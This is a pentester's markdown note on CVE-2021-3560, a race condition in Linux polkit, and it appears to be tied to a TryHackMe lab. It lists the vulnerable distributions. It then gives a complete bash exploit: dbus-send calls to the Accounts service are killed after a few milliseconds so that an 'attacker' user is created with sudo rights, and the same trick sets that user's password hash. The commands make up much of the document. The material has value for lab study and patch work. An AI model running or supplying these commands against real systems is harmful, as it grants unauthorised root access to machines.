# CVE-2021-3560

[Kevin Backhouse](https://github.blog/author/kevinbackhouse/) discovered a seven year old privilege escalation vulnerability (since designated CVE-2021-3560) in the Linux [polkit](https://gitlab.freedesktop.org/polkit/polkit/) utility. It is system service running whenever you see a GUI `Authentication Required` and is part of the Linux authorisation system.

**Requires text-based session as Polkit has GUI functionality!** 

```bash
pkexec # not sudo to interact with polkit
```

|Distribution|Vulnerable?|
|---|---|
|RHEL 7|No|
|RHEL 8|[Yes](https://access.redhat.com/security/cve/CVE-2021-3560)|
|Fedora 20 (or earlier)|No|
|Fedora 21 (or later)|[Yes](https://bugzilla.redhat.com/show_bug.cgi?id=1967424)|
|Debian 10 (“buster”)|No|
|Debian testing (“bullseye”)|[Yes](https://security-tracker.debian.org/tracker/CVE-2021-3560)|
|Ubuntu 18.04|No|
|Ubuntu 20.04|[Yes](https://ubuntu.com/security/CVE-2021-3560)|

[Kevin Backhouse](https://github.blog/author/kevinbackhouse/): *The vulnerability is triggered by starting a `dbus-send` command but killing it while polkit is still in the middle of processing the request.* It is race condition in Polkit where we can add another new user and add that user to the sudo group then set that new user's password.

0. Time the execution
1. Create a new user by performing a race condition kill command exactly half way 
2. Run multiple times until new user is created
3. Create Password hash
4. Set the password of the new user - get the new create user's UID before running the final command. 

Exploitation Steps:
```bash
# Time the creation of a new user 
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
# Race condition to kill command half way through execution to create new user and add to sudo group
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
# Check user has been created
id attacker
# Password hash creation for the hash used below 
openssl passwd -6 Expl01ted
# Set the password hash - beware of the UID of the newly created user in required in the fllow command
UID="insert the affective user id for the newly created user in the command below"
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$UID org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

## References

[THM Polkit CVE-2021-3560](https://tryhackme.com/room/polkit)
[polkit](https://gitlab.freedesktop.org/polkit/polkit/)
[Kevin Backhouse](https://github.blog/author/kevinbackhouse/)
[Github.Blog - Kevin Backhouse Blog](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)